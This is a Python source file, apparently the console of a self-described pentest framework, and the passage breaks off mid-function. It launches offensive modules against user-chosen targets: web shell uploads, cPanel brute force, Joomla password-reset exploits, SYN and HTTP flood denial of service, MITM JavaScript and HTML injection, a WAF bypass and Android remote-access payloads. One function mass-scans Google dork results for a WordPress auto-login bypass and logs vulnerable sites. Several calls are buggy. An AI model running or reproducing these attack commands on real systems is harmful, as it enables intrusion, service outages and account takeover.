#!/usr/bin/python

import os, time, sys, random,bs4
import os as sistema
import readline, rlcompleter
from urllib2 import quote
from socket import timeout
from urllib2 import urlopen
from urllib2 import Request
from sys import argv
from commands import *
from core import banner

# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
E = '\033[0m' # End
if not os.geteuid() == 0:
    sys.exit("""\033[1;91m\n[!] Pentest Tools Framework installer must be run as root!!. \n\033[1;m""")

def clean():
    os.system("clear")
print "\033]2; Pentest Framework\a"
def  bg():
  banner.banner()
clean()
bg()
print
print ""+N+"       =[ "+O+"Pentest v1.0 by WongNdeso             "+N+"]"
print "+ -- --=[ "+R+"18 exploits - 16 scanners             "+N+"]"
print "+ -- --=[ Design by Ari                         "+N+"]"
print "+ -- --=[ Report bug on Telegram "+R+"@WongNdeso     "+N+"]\n"
def ipconfig():
    print "\n"
    os.system('iwgetid -r') # Get wireless network name
    os.system("ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}' | cut -f1  -d'/'") # Get network mac
    os.system("hostname -I") # Local IP address
    os.system("hostname") # hostname
    print "\n"


def info():
    print("""\033[1;31m
             Pentest Tools Framework\033[1;32m
                         V1.0
    -----------------------------------------------
              Emails:xzhack206@gmail.com\033[1;33m
              Telegram:@WongNdesoCok
=======================================================\033[1;21m
       Pentest Tools Framework  Copyright (C) 2019  Ari\033[1;31m
=======================================================
        Report Bugs and ask questions[**]:\033[1;m
  	   \033[1;35m xzhack206@gmail.com
     \n""")
    main()
def update():
    print ""+B+"~ "+N+"Updating..."
    time.sleep(3)
    print
    print ""+G+" Pentest WAS UPGRADED!"
    time.sleep(1)
    print
    print ""+N+"Cloning newly updated..."
    time.sleep(5)
    os.system("cd ~ ; rm -r ~/Pentest ; git clone https://github.com/3xploit-db/Pentest-Tools-Framework ; cd Pentest ")
    time.sleep(3)
    print ""+B+"~ "+N+"Updated!"
    time.sleep(1)
    print
    main()

def option():
    print
    print "       command                     options"
    print "       =======                    =========="
    print
    print "       set target                 Set Target"
    print "       run                        Start Attacks"
    print "       clear                      Clean Pentest input/output"
    print "       back                       Back To menu"
    print
#EXPLOITS
def php():
   list = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/php_thumb_shell_upload"+N+"): ")
   if list == 'show options':
       option()
       php()
   elif list == "back":
       main()

   elif list == 'set target':
        go = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/php_thumb_shell_upload (set target)"+N+"): ")
        print "target =>"+R+"",go
        if go == "run":
            time.sleep(2)
            print ""+B+"[*] "+N+"Starting attacks..."
            os.system("cd modules;cd exploit_phpthumb;perl rcexploit.pl %s" % (list))
            print ""+B+"[*]"+N+" Job finished!"
            php()
        elif go =='back':
            main()
   elif list == 'clear':
        clean()
        php()
   else:
       print "Wrong Command => ", list
       print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
       php()

def cpanel():
    vc = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce"+N+"): ")
    if vc == 'show options':
        option()
        cpanel()
    elif vc == "back":
        main()
    elif vc == 'set target':
        usr = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce (set user)"+N+"): ")
        print "username = >"+R+"",usr
        port = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce (set lport)"+N+"): ")
        print "LPORT = > "+R+"",port
        pss = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce (set list)"+N+"): ")
        print "list =>"+R+"",pss
        pas = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce (set savePass)"+N+"): ")
        print "save on => "+R+"",pas
        god = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/cpanel_bruteforce"+N+"): ")
        if god == "run":
            print ""+B+"[*] "+N+"Starting attacks..."
            os.system("cd modules;cd cpanel;perl cpanel.pl %s %s %s %s %s" % (vc,usr,port,pss,pas))
            print ""+B+"[*]"+N+" Job finished!"
            print
            cpanel()
        elif god == 'back':
            main()
    elif vc =='clear':
        clean()
        cpanel()
    else:
        print "Wrong Command => ", vc
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        cpanel()
def java():
    jav = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript"+N+"): ")
    if jav == 'show options':
        option()
        java()
    elif jav == "back":
        main()
    elif jav == 'set target':
         parse = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set parse)"+N+"): ")
         ips = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set ips)"+N+"): ")
         js_file = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set js_file)"+N+"): ")
         up_interface = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set up_interface)"+N+"): ")
         gateway = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript (set gateway)"+N+"): ")
         ja = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/inject_javascript"+N+"): ")
         if ja =="run":
            os.system("xettercap %s --proxy-module=injectjs --js-file %s -I %s --gateway %s" % (parse, ips, js_file, up_interface, gateway))
            java()
         elif ja =="back":
              main()
    elif jav == 'clear':
        clean()
        java()
    else:
        print "Wrong Command => ", jav
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        java()

def joomla():
    jom = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_com_hdflayer"+N+"): ")
    if jom == 'show options':
        option()
        joomla()
    elif jom == "back":
        main()
    elif jom == 'set target':
          t = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/joomla_com_hdflayer (set target)"+N+"): ")
          print "target => "+R+"",t
          f = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/joomla_com_hdflayer (set shellock)"+N+"): ")
          print "target => "+R+"",f
          r = raw_input(""+N+"(Pentest)> ("+B+"modules/exploits)("+R+"exploit/joomla_com_hdflayer"+N+"): ")
          if r == "run":
              print ""+B+"[*] "+N+"Starting attacks..."
              os.system("cd modules;cd exploit_joomla;python exploitjoomla.py -t %s -f %s" % (t,f))
              print ""+B+"[*]"+N+" Job finished!"
              print
              joomla()
          elif r == 'back':
               main()
    elif jom == 'clear':
        clean()
        joomla()
    else:
        print "Wrong Command => ", jom
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        joomla()

def shell():
    sel = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/wp_symposium_shell_upload"+N+"): ")
    if sel == 'show options':
        option()
        shell()
    elif sel == "back":
        main()
    elif sel == 'set target':
         vc = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/wp_symposium_shell_upload (set target)"+N+"): ")
         print "target => "+R+"",vc
         fl = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/wp_symposium_shell_upload (set shellock)"+N+"): ")
         print "shell location = > "+R+"",fl
         ru = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/wp_symposium_shell_upload"+N+"): ")
         if ru == "run":
             print ""+B+"[*] "+N+"Starting attacks..."
             os.system("cd modules;cd prestashop;python wp-symposium.py -t %s -f %s" % (vc,fl))
             print ""+B+"[*]"+N+" Job finished!"
             print
             main()
         elif ru == 'back':
             main()
    elif sel =='clear':
        clean()
        shell()
    else:
        print "Wrong Command => ", sel
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        shell()
def jomday():
    day = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla0day_com_myngallery"+N+"): ")
    if day == 'show options':
        option()
        jomday()
    elif day == "back":
        main()
    elif day == 'set target':
         ft = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/joomla0day_com_myngallery (set target)"+N+"): ")
         print "target =>"+R+"",ft
         gr = raw_input(""+N+"(Pentest)> ("+B+"modules/exploits)("+R+"exploi/joomla0day_com_myngallery"+N+"): ")
         if gr == "run":
             time.sleep(1)
             print ""+B+"[*] "+N+"Starting attacks..."
             os.system("cd modules;cd jom0;perl 0day.pl %s" % (ft))
             print ""+B+"[*]"+N+" Job finished!"
             print
             jomday()
         elif gr == 'back':
             main()
    elif day == 'clear':
        clean()
        jomday()
    else:
        print "Wrong Command => ", day
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        jomday()
def jomsi():
    si = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_simple_shell"+N+"): ")
    if si == 'show options':
        option()
        jomsi()
    elif si == "back":
        main()
    elif si== 'set target':
         ru = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_simple_shell (set target)"+N+"): ")
         print "target =>", ru
         star = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_simple_shell"+N+"): ")
         if star == 'run':
             os.system("cd modules;cd joomla_ex;python joomla.py")
             print ""+B+"[*]"+N+" Job finished!"
             print
             jomsi()
         elif star == 'back':
             main()
    elif si =='clear':
        clean()
        jomsi()
    else:
        print "Wrong Command => ", si
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        jomsi()

def jomfox():
    jj = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_com_foxcontact"+N+"): ")
    if jj == 'show options':
        option()
        jomfox()
    elif jj == "back":
        main()
    elif jj== 'set target':
         ts = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_com_foxcontact (set target)"+N+"): ")
         print "target => "+R+"",ts
         print ""+N+"=>"+N+" id?"+R+" example.com/index.php?option=com_foxcontact&view=foxcontact&Itemid="+G+"161 "+R+"<="
         cid = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/joomla_com_foxcontact (set CID)"+N+"): ")
         print "CID => "+R+"",cid
         kt = raw_input(""+N+"(Pentest)> ("+B+"modules/exploits)("+R+"joomla_com_foxcontact"+N+"): ")
         if kt == "run":
             time.sleep(1)
             print ""+B+"["+R+"*"+B+"]"+N+" Starting attacks..."
             os.system("cd modules;cd com_foxcontact;python exploit.py --url %s --cid %s" % (ts,cid))
             print ""+B+"[*]"+N+" Job finished!"
             print
             jomfox()
         else:
             jomfox()
    elif jj =='clear':
        clean()
        jomfox()
    else:
        print "Wrong Command => ", jj
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        jomfox()
def jmauto():
    jm = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jm_auto_change_pswd"+N+"): ")
    if jm == 'show options':
        option()
        jmauto()
    elif jm == "back":
        main()
    elif jm == 'set target':
         er = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jm_auto_change_pswd (set target)"+N+"): ")
         print "target =>"+R+"",er
         pa = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jm_auto_change_pswd (set newpass)"+N+"): ")
         print "new pass => "+R+"",pa
         y = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/jm_auto_change_pswd"+N+"): ")
         time.sleep(2)
         if y == "run":
             print ""+B+"[*] "+N+"Starting attacks..."
             os.system("cd modules;cd autoriset_joomla0day;perl joomlariset.pl %s %s" % (er,pa))
             print ""+B+"[*]"+N+" Job finished!"
             print
             jmauto()
         else:
             jmauto()
    elif jm == 'clear':
        clean()
        jmauto()
    else:
        print "Wrong Command => ", jm
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        jmauto()
def dos():
    dd = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/power_dos"+N+"): ")
    if dd == 'show options':
        option()
        dos()
    elif dd == "back":
        main()
    elif dd == 'set target':
         target = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/power_dos (set target)"+N+"): ")
         print "target =>"+R+"",target
         run = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/power_dos"+N+"): ")
         if run == "run":
             os.system("cd modules;cd hulk_attacks;python hulk.py %s" % (target))
             print ""+B+"[*]"+N+" Job finished!"
             print
             dos()
         else:
             dos()
    elif dd == 'clear':
        clean()
        dos()
    else:
        print "Wrong Command => ", dd
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        dos()

def android():
    reload(sys)
    sys.setdefaultencoding("utf-8")

    host = " "
    port = " "
    output = " "
    def help():
     print("""
      Global Options
      ============
           Name         Description
           -------      ---------------
           set HOST     (example set HOST 127.0.0.1)
           set PORT     (example set PORT 444)
           set PATH     (example set OUTPUT /home/payload)
           generate     generating payloads
           show info    Info
           exploit      start exploit/start client server
           back         back to menu
           \n""")

    def start():
        global host, port, output

        while True:
            cmd = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/android_remote_acces"+N+"): ").lower()
            if cmd == "show options":
                help()

            elif cmd == 'clear':
                os.system("clear")
                start()
            elif "back" in cmd:
                main()

            elif "set host" in cmd:
                host = cmd.split()[-1]
                print " HOST "+N+"=>"+R+"",cmd.split()[-1]

            elif "set port" in cmd:
                port = int(cmd.split()[-1])
                print " PORT "+N+"=>"+R+"",cmd.split()[-1]

            elif "set path" in cmd:
                output = cmd.split()[-1]
                print " PATH "+N+"=>"+R+"",cmd.split()[-1]

            elif cmd == "show info":
                print " \nHOST => %s \nPORT => %s \nPATH => %s \n"%(host, port,output)

            elif cmd == "generate" or cmd == "payloads":
                if host != " " and port != " " and output != " ":
                    sleep(1)
                    print(" \nHOST => "+host+" \nPORT => "+str(port)+" \nPATH => "+output)
                    sleep(3)
                    os.system("sh modules/gen.sh "+host+" "+str(port)+" "+output)
                    print("\n"+R+"["+B+"*"+R+"]"+N+" Payloads succes with 762 bytes...")
                    sleep(1)
                    start()
                else:
                    print "\nHOST => %s \nPORT => %s \nPATH => %s" %(host,port,output)
                    start()
            elif cmd == "exploit" or cmd == "run" or cmd == "start listener":
                if host != " " and port != " ":
                    if os.name == "nt":
                        subprocess.Popen([sys.executable, 'modules/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                    else:
                        os.system(sys.executable + " modules/listener.py %s %s"%(host, str(port)))
                else:
                    print " \nHost => %s \nPort => %s\n"%(host,port)
            else:
                print(""+B+"["+R+"!"+B+"]"+N+" Keyboard Intrupped!")
                main()

    def contol():
        try:
            start()
        except KeyboardInterrupt:
            print("\n"+B+"["+R+"*"+B+"]"+N+" exiting...")
            sleep(2)
            sys.exit()
    if __name__ == "__main__":
        contol()
def dns_b():
    dn = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/dns_bruteforce"+N+"): ")
    if dn == 'show options':
        option()
        dns_b()
    elif dn == 'back':
        main()
    elif dn == 'set target':
        port = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/dns_bruteforce (set port)"+N+"): ")
        target = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/dns_bruteforce (set target)"+N+"): ")
        print "port target => ", target, port
        rr = raw_input(""+N+"Pentest>> ("+R+"exploi/dns_bruteforce"+N+"): ")
        if rr == 'run':
          os.system("nmap -p %s --script dns-brute.nse %s " % (port, target))
          dns_b()
        else:
            dns_b()
    elif dn == 'clear':
        clean()
        dns_b()
    else:
        print "Wrong Command => ", dn
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        dns_b()
def hping3():
    dos = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/dos_attack"+N+"): ")
    if dos == 'show options':
       option()
       hping3()
    elif dos =='back':
        main()
    elif dos =='clear':
        clean()
        hping3()
    elif dos =='set target':
        target =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/dos_attack (set target)"+N+"): ")
        print "target => ", target
        if target == 'run':
           os.system("hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source %s " % (target))
           hping3()
        else:
            hping3()
    else:
        print "Wrong Command => ", hping3
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        hping3()
def html():
    inj = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html"+N+"): ")
    if inj =='show options':
        option()
        html()
    elif inj =='back':
        main()
    elif inj =='clear':
        clean()
        html()
    elif inj =='set target':
        parse =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"target_parse)"+N+"): ")
        ips =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"target_ips)"+N+"): ")
        html =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"file_html)"+N+"): ")
        interface =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"up_interface)"+N+"): ")
        gateway =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html ("+G+"gateway)"+N+"): ")
        print "press run for Attacks"
        ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/inject_html"+N+"): ")
        if ra == 'run':
           os.system("xettercap %s %s --proxy-module=/opt/Pentest/modules/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file %s -I %s --gateway %s " % (parse, ips, html, interface, gateway))
           html()
        else:
            html()
    else:
        print "Wrong Command => ", inj
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        html()

def shake():
    sha = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen "+N+"): ")
    if sha =='show options':
        option()
        shake()
    elif sha =='back':
        main()
    elif sha =='clear':
        clean()
        shake()
    elif sha =='set target':
        parse =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen ("+G+"target_parse)"+N+"): ")
        ips =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen ("+G+"target_ips)"+N+"): ")
        interface =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen ("+G+"up_interface)"+N+"): ")
        gateway =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen ("+G+"gateway)"+N+"): ")
        print "press run for Attacks"
        ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/shakescreen"+N+"): ")
        if ra == 'run':
           os.system("xettercap %s %s --proxy-module=injectjs --js-file '/opt/Pentest/modules/bettercap/modules/js/shakescreen.js' -I %s --gateway %s " % (parse, ips, interface, gateway))
           shake()
        else:
            shake()
    else:
        print "Wrong Command => ", sha
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        shake()
def waf():
    sha = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/bypass_waf"+N+"): ")
    if sha =='show options':
        option()
        waf()
    elif sha =='back':
        main()
    elif sha =='clear':
        clean()
        waf()
    elif sha =='set target':
        target =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/bypass_waf ("+G+"target)"+N+"): ")
        ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/bypass_waf"+N+"): ")
        if ra == 'run':
           os.system('python modules/wafninja/wafninja.py bypass -u %s -p "Name=PAYLOAD&Submit=Submit" -c "phpsessid=value" -t xss -o log/output.html' % (target))
           waf()
        else:
            waf()
    else:
        print "Wrong Command => ", sha
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        waf()
def enum():
    sha = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/enumeration"+N+"): ")
    if sha =='show options':
        option()
        enum()
    elif sha =='back':
        main()
    elif sha =='clear':
        clean()
        enum()
    elif sha =='set target':
        target =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/enumeration ("+G+"target)"+N+"): ")
        ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/enumeration"+N+"): ")
        if ra == 'run':
           os.system('perl modules/enum/enum4linux.pl -U %s ' % (target))
           enum()
        else:
            enum()
    else:
        print "Wrong Command => ", sha
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        enum()
def res():
    sha = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/restrict_anonymous"+N+"): ")
    if sha =='show options':
        option()
        res()
    elif sha =='back':
        main()
    elif sha =='clear':
        clean()
        res()
    elif sha =='set target':
        u =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/restrict_anonymous ("+G+"User)"+N+"): ")
        p =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/restrict_anonymous ("+G+"Pass)"+N+"): ")
        target =raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/restrict_anonymous ("+G+"Target)"+N+"): ")
        ra = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploi/enumeration"+N+"): ")
        if ra == 'run':
           os.system('perl modules/enum/enum4linux.pl -u %s -p %s -U %s ' % (u, p, target))
           res()
        else:
            res()
    else:
        print "Wrong Command => ", sha
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        res()
#####################################################################################
#ScannerS
def xss():
    cs = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/cms_war "+N+"): ")
    if cs == 'show options':
        option()
        xss()
    elif cs == 'set target':
        tops = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/cms_war (set target)"+N+"): ")
        print "target =>"+R+"" ,tops
        gay = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/cms_war"+N+"): ")
        if gay == "run":
            print ""+B+"[*]"+N+" Starting attacks Scanning..."
            os.system("cd modules;cd xsspy;python XssPy.py -u %s -v" % (tops))
            print ""+B+"[*]"+N+" Job finished!"
            print
            xss()
        else:
            xss()
    elif cs =='back':
        main()
    elif cs =='clear':
        clean()
        xss()
    else:
        print "Wrong Command => ", cs
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        xss()
def wordpress():
    wor = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/usr_pro_wordpress_auto_find"+N+"): ")
    if wor == 'show options':
        print "Name                  Description"
        print "=====                ============="
        print "set target           start target"
        print "back                 back to menu"
        wordpress()
    elif wor == 'back':
        main()
    elif wor == 'set target':
         def tracker(keywords, start):
                 searchQuery = quote(keywords, safe='')  # This line makes the script Support all encodings
                 try:
                     url = "https://www.google.com/search?gl=ir&num=100&start=" + str(
                         start) + "&pws=0&as_qdr=all&dcr=0&q=" + searchQuery
                     req = Request(url)  # Sets the SERPs URL!!
                 except timeout:
                     print("Connection timed out!")
                 req.add_header('User-Agent',
                                'userpro1 aef by orm')
                 serpURL = urlopen(req).read()  # Opens and Reads The Serp Page
                 soup = bs4.BeautifulSoup(serpURL, "html.parser")  # Sets the Serp URL On Soup
                 allResults = []  # An Empty Array to Save the Results
                 i=0
                 for hit in soup.findAll('cite'):  # a for-each loop, to check all <cite ....> Elements in Page
                       # if the domain was between <cite> and </cite>
                     allResults.append(
                           str("")+hit.text)  # Results will add to allResults
                     i=i+1
                 if (len(allResults) == 0):
                     return(""+R+"[!] "+N+"No result found for this keyword => " + keywords)
                 else:
                     print(""+B+"[*]"+N+" Ok! Starting... \n")

                     for element in allResults:  # Prints all the results
                         if (element.startswith("http://")):
                             element = element[7:]
                         if (element.startswith("https://")):
                              element = element[8:]
                         if (element.startswith("www.")):
                             element = element[4:]
                         element=element[:element.find("/")]
                         element="http://"+element
                         print("checking "+element+" :")
                         if (checkwp(element)):
                             suc = str(checkVul(element))
                             if( suc=="True"):
                                 try:
                                     filee = open("priv8.txt", mode="a+")
                                     filee.write(element+"\n")
                                     filee.close()
                                 except:
                                     print(""+R+"error"+N+"")
                                 print (suc)
                             else:
                                 print (""+R+"False"+N+"")

                         else:
                            print (element + ""+R+" =>"+N+" " + str(checkwp(element)))


         def checkwp(url):
             url+="/wp-content/plugins/userpro/css/userpro.min.css"
             try:
              pURL = urlopen(url).read()
             except:
                 return False
             if (pURL.find(".userpro")>-1):
                 print (""+B+"[!] "+N+" Plugin is installed checking vulnerable...\n")
                 return True
             else:
                 return False
         def checkVul(url):
             url1=url + "/?up_auto_log=true"
             try:
                 pURL = urlopen(url1).read()
                 if (pURL.find("admin-bar-css")>-1):
                    return True
                 elif (urlopen(url + "/wp-admin").read().find("admin-bar-css")>-1):
                     return True
                 else :return False
             except:
                 return False
         while(True):
             x = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/usr_pro_wordpress_auto_find (set Dork)"+N+"): ")
             time.sleep(1)
             print "DORKS => "+R+"",x
             n= raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/usr_pro_wordpress_auto_find (start number)"+N+"): ")
             print "START NUMBER => "+R+"",n
             g= raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/usr_pro_wordpress_auto_find (set end_number)"+N+"): ")
             print "END NUMBER => "+R+"",g
             run = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/usr_pro_wordpress_auto_find"+N+"): ")
             if run == "run":
             	print ""+B+"[*] "+N+"Starting attacks..."
             while(True):
                 tracker(x, n)
                 y=raw_input(""+B+"[*]"+N+" Next (y/n)?")
                 if(y=="y"):
                     n+=g;
                     tracker(x, n)
                 else:
                     main()
             y1=raw_input(""+B+"[*]"+N+" Anouther dork (y/n) ?")
             if (y1 == "y"):
                 continue
             else:
                 main()
    elif wor == 'clear':
        clean()
        wordpress()

    else:
        print "Wrong Command => ", wor
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        wordpress()
def cms():
    cs = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/cms_war "+N+"): ")
    if cs == 'show options':
        option()
        cms()
    elif cs == 'set target':
        tops = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/cms_war (set target)"+N+"): ")
        print "target =>"+R+"" ,tops
        print ""+N+"=> "+R+"scan "+N+"[dir, shell, backup, files, admin]"
        ray = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/cms_war (scan)"+N+"): ")
        gay = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/cms_war"+N+"): ")
        if gay == "run":
            print ""+B+"[*]"+N+" Starting attacks..."
            os.system("cd modules;cd scanner;python scanner.py %s -m %s" % (tops,ray))
            print ""+B+"[*]"+N+" Job finished!"
            print
            cms()
        else:
            cms()
    elif cs =='back':
        main()
    elif cs =='clear':
        clean()
        cms()
    else:
        print "Wrong Command => ", cs
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        cms()
def wordpress_scan():
    sec = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/wordpress_user_scanners"+N+"): ")
    if sec == 'show options':
        option()
        wordpress_scan()
    elif sec =='back':
        main()
    elif sec =='set target':
        wop = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/wordpress_user_scanners (target)"+N+"): ")
        enum = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/wordpress_user_scanners (user)"+N+"): ")
        uiop = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/wordpress_user_scanners"+N+"): ")
        if uiop == "run":
            print ""+B+"[*]"+N+" Starting attacks..."
            os.system("cd modules;cd wscan;python wpscanner.py -s %s -n %s" % (wop,enum))
            print ""+B+"[*]"+N+" Job finished!"
            print
            wordpress_scan()
        else:
            wordpress_scan()
    elif sec == 'clear':
        clean()
        wordpress_scan()
    else:
        print "Wrong Command => ", sec
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        wordpress_scan()
def dirse():
    dir = raw_input("Pentest>> ("+B+"modules/scanners)("+R+"scanner/dir_search"+N+"): ")
    if dir == 'show options':
       option()
       dirse()
    elif dir =='back':
        main()

    elif dir == 'set target':
        ym = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/dir_search (set target)"+N+"): ")
        print "target => "+R+"",ym
        puki = raw_input("Pentest>> ("+B+"modules/scanners)("+R+"scanner/dir_search (set extensions)"+N+"): ")
        dih = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/dir_search"+N+"): ")
        if dih == "run":
            os.system("python mpdules/dirsearch/dirsearch.py -u %s -e %s" % (ym,puki))
            print ""+B+"[*]"+N+" Job finished!"
            print
            dirse()
        else:
            dirse()
    elif dir =='clear':
        clean()
        dirse()
    else:
        print "Wrong Command => ", dir
        print ""+N+""+B+"["+R+"!"+B+"] "+N+"Please enter 'show options'"
        dirse()
def lfi():
    lf = raw_input(""+N+"Pentest>> ("+B+"modules/scanners)("+R+"scanner/lfi_scanner"+N+"): ")
    if lf == 'show options':
       option()
       lfi()
    elif lf == 'back':
         main()

    elif lf == 'set target':
